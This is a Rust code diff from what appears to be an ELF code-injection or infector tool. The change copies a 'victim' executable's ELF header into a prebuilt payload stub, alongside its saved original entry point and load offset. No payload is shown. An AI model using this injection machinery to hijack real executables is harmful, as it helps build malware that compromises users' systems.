@@ -16,13 +16,14 @@ const SUCC: &str = "\x1b[32m[+]\x1b[0m";
 const FAIL: &str = "\x1b[31m[-]\x1b[0m";
 const INFO: &str = "\x1b[34m[*]\x1b[0m";
 
-fn reloc_bin(entry: u64, offset: u64) -> Result<(), Box<dyn Error>>
+fn reloc_bin(entry: u64, offset: u64, ehdr: &celf::ElfHeader) -> Result<(), Box<dyn Error>>
 {
     let flat_elf = ExecuteLinkFile::prase("flat")?;
 
     let e_entry = flat_elf.prase_sym("_old_entry")?.st_value as usize;
     let load_offset = flat_elf.prase_sym("_load_address_offset")?.st_value as usize;
     let self_size = flat_elf.prase_sym("_self_size")?.st_value as usize;
+    let victim_eh = flat_elf.prase_sym("_victim_eh")?.st_value as usize;
 
     let mut bin_buffer = fs::read("flat.bin")?;
     let bin_sz = bin_buffer.len();
@@ -30,6 +31,7 @@ fn reloc_bin(entry: u64, offset: u64) -> Result<(), Box<dyn Error>>
     bin_buffer[e_entry..e_entry+8].copy_from_slice(&entry.to_le_bytes());
     bin_buffer[load_offset..load_offset+8].copy_from_slice(&offset.to_le_bytes());
     bin_buffer[self_size..self_size+8].copy_from_slice(&bin_sz.to_le_bytes());
+    bin_buffer[victim_eh..victim_eh+size_of::<celf::ElfHeader>()].copy_from_slice(bytes_of(ehdr));
 
     print!("{SUCC} Set _old_entry={:#0x}. \r\n", entry);
     print!("{SUCC} Set _load_address_offset={:#0x}. \r\n", offset);
@@ -59,10 +61,11 @@ pub fn main() -> Result<(), Box<dyn Error>> {
     }
 
     print!("{INFO} Load offset determined at {:#0x}. \r\n", load_offset);
-
-    reloc_bin(entry, load_offset)?;
-
     let mut target = fs::read(target_path)?;
+    let ehdr_slice = target.get(0..size_of::<celf::ElfHeader>()).context("Broken Elf file")?;
+    let ehdr_obj = bytemuck::try_from_bytes::<celf::ElfHeader>(ehdr_slice).ok().context("Broken Elf file")?;
+
+    reloc_bin(entry, load_offset, ehdr_obj)?;
 
     let prog_hear_size = header.e_phentsize as usize * header.e_phnum as usize;
     let mut prog_hear_dump = target[(header.e_phoff as usize)..(header.e_phoff as usize) + prog_hear_size].to_vec();
